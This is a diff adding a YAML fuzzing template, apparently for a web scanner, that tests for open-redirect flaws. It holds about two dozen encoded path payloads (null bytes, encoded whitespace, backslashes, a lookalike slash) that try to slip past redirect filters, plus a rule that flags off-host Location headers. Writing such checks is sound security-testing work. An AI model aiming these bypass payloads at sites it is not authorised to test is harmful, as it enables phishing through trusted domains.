@@ -1,0 +1,50 @@
+id: open-redirect-03
+level: 2
+type: fuzz
+info:
+  name: Open Redirect FUZZ on Path 01
+  risk: low
+
+variables:
+  - prefix: |
+      http://
+      https://
+  - dest: |
+      google.com
+      example.com
+
+# origin: gonna come from Burp
+payloads:
+  - '{{.dest}}'
+  - '/{{.dest}}'
+  - '\{{.dest}}'
+  - '//{{.dest}}/'
+  - '\/\/{{.dest}}/'
+  - '%00\/\/{{.dest}}/'
+  - '/%00/{{.dest}}/'
+  - '/%09/{{.dest}}/'
+  - '/%0a/{{.dest}}/'
+  - '/%0d/{{.dest}}/'
+  - '////{{.dest}}/%2f%2e%2e'
+  - '/%5c{{.dest}}/%2f%2e%2e'
+  - '/〱{{.dest}}/%2f%2e%2e'
+  - '@{{.dest}}'
+  - '{{.prefix}}{{.dest}}'
+  - '/{{.prefix}}{{.dest}}'
+  - '\{{.prefix}}{{.dest}}'
+  - '//{{.prefix}}{{.dest}}/'
+  - '\/\/{{.prefix}}{{.dest}}/'
+  - '%00\/\/{{.prefix}}{{.dest}}/'
+  - '////{{.prefix}}{{.dest}}/%2f%2e%2e'
+  - '/%5c{{.prefix}}{{.dest}}/%2f%2e%2e'
+  - '/〱{{.prefix}}{{.dest}}/%2f%2e%2e'
+  - '@{{.prefix}}{{.dest}}'
+
+requests:
+  - generators:
+      - Path("{{.payload}}", "*")
+      - Path("[[.original]]/{{.payload}}", "*")
+    # redirect: true
+    detections:
+      - >-
+        (StatusCode() >= 300 && StatusCode() < 400) && RegexSearch("resHeaders", "Location:\\s(http|https?:)([\\/]+){{.dest}}") && !StringSearch("resHeaders", "Location: https://{{.Host}}")
